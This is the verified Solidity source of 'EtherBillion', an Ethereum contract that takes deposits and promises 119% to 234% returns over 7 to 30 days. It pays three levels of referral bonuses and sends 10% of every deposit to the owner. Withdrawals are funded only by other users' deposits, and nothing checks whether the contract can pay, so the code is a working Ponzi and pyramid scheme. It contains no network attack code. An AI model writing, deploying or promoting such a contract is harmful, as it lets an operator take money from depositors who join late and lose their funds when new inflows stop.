/**
 *Submitted for verification at Etherscan.io on 2020-07-17
*/

// SPDX-License-Identifier: MIT License
pragma solidity ^0.6.8;

contract ReentrancyGuard {
    uint256 internal constant _NOT_ENTERED = 1;
    uint256 internal constant _ENTERED = 2;

    uint256 internal _status;

    constructor () internal {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

contract EtherBillion is ReentrancyGuard {
    struct Plan {
        uint8 life_days;
        uint8 percent;
    }

    struct Deposit {
        uint8 plan;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint40 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }

    address payable public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;

    uint8[] public ref_bonuses; // 1 => 1%

    Plan[] public plans;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 plan);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender;

        plans.push(Plan(7, 119));
        plans.push(Plan(8, 124));
        plans.push(Plan(9, 129));
        plans.push(Plan(10, 134));
        plans.push(Plan(11, 139));
        plans.push(Plan(12, 144));
        plans.push(Plan(13, 149));
        plans.push(Plan(14, 154));
        plans.push(Plan(15, 159));
        plans.push(Plan(16, 164));
        plans.push(Plan(17, 169));
        plans.push(Plan(18, 174));
        plans.push(Plan(19, 179));
        plans.push(Plan(20, 184));
        plans.push(Plan(21, 189));
        plans.push(Plan(22, 194));
        plans.push(Plan(23, 199));
        plans.push(Plan(24, 204));
        plans.push(Plan(25, 209));
        plans.push(Plan(26, 214));
        plans.push(Plan(27, 219));
        plans.push(Plan(28, 224));
        plans.push(Plan(29, 229));
        plans.push(Plan(30, 234));

        ref_bonuses.push(5);
        ref_bonuses.push(3);
        ref_bonuses.push(1);
    }

    function payoutOf(address _addr) view public returns(uint256 value) {
        Player memory player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit memory dep = player.deposits[i];
            Plan memory plan = plans[dep.plan];

            uint40 time_end = dep.time + plan.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * plan.percent / plan.life_days / 8640000;
            }
        }

        return value;
    }

    function _payout(address _addr) internal {
        uint256 payout = payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) internal {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;

            uint256 bonus = _amount * ref_bonuses[i] / 100;

            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) internal {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }
            else {
                players[_addr].direct_bonus += _amount / 100;
                direct_bonus += _amount / 100;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }

    function deposit(uint8 _plan, address _upline) external payable nonReentrant {
        require(plans[_plan].life_days > 0, "Plan not found");
        require(msg.value >= 0.01 ether, "Zero amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            plan: _plan,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        owner.transfer(msg.value / 10);

        emit NewDeposit(msg.sender, msg.value, _plan);
    }

    function withdraw() external nonReentrant {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }


    function userInfo(address _addr) view external returns(uint256 for_withdraw,
        uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
        payout + player.dividends + player.direct_bonus + player.match_bonus,
        player.total_invested,
        player.total_withdrawn,
        player.total_match_bonus,
        structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {
        return (invested, withdrawn, direct_bonus, match_bonus);
    }
}